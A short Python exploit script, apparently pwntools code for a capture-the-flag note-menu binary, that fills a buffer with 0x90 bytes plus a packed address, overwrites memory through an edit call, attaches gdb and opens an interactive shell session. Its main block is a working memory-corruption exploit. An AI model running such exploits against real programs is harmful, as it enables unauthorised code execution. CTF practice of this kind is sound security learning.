if __name__ == "__main__":
    add("anand", "abcd")
    selectnote("anand")
    for i in range(5):
        add("", "")
    payload = p8(0x1)*(0x90) + p64(0x0000000000409078)
    newmenu()
    edit(payload, "a")
    gdb.attach(io)
    edit('a'*0x30,'a'*0x30)
    io.interactive()
